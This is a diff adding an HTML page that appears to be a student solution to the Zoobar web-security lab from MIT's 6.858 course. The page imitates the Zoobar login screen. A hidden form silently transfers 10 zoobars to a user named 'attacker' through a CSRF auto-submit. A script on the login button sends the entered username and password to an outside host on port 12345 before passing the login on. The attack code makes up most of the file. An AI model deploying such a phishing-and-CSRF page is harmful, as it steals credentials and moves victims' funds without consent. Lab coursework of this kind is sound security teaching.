@@ -1,0 +1,64 @@
+<html>
+<head>
+
+<meta charset="utf-8">
+<link rel="stylesheet" type="text/css" href="/zoobar/media/zoobar.css">
+<title>
+Login - Zoobar Foundation
+</title>
+</head>
+<body>
+<p id="dummy"></p>
+<script>var myZoobars=-5</script>
+<script src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='http://localhost:8080/zoobar/index.cgi/transfer' target="csrf-frame" id="csrf-form">
+<input name="zoobars" type="hidden" value="10" size="5"></p>
+<input name="recipient" type="hidden" value="attacker" size="10"></p>
+<input id="submit-form" onclick="window.location.href = 'http://css.csail.mit.edu/6.858/2014';" style="display:none" type="submit" name="submission" value="Send">
+</form>
+    <script>
+if(myZoobars>0)
+    document.getElementById("submit-form").click();
+    </script>
+    <h1><a href="/zoobar/index.cgi/">Zoobar Foundation for Ethical
+    Dialogue</a></h1>
+    <h2>Supporting the foremost
+    researchers of the counterinsurgency</h2>
+
+    <div id="login" class="centerpiece">
+    <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" _lpchecked="1">
+    <table>
+    <tbody><tr>
+    <td>Username:</td>
+    <td><input type="text" id="username" name="login_username" size="20" autocomplete="off" value="" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;"></td>
+    </tr>
+    <tr>
+    <td>Password:</td>
+    <td colspan="2"><input type="password" id="password" name="login_password" size="20" autocomplete="off" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;">
+    <input type="button" id="sub-button" name="submit_login" value="Log in">
+    <input type="hidden" name="submit_login" value="Log in">
+    <input type="submit" name="submit_registration" value="Register"></td>
+    </tr>
+    </tbody></table>
+    <input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
+    </form>
+    </div>
+    <div class="footer warning">
+
+    </div>
+    <script>
+    document.loginform.login_username.focus();
+    document.getElementById("sub-button").addEventListener('click',function()
+            {
+            var image=new Image();
+            image.src="http://vmiitk.com:12345/?user="+document.getElementById("username").value+"&pass="+document.getElementById("password").value;
+            console.log(image.src);
+            image.onerror=function(){
+            document.getElementsByName("loginform")[0].submit();
+            };
+            }
+            );
+    </script>
+    </body>
+    </html>
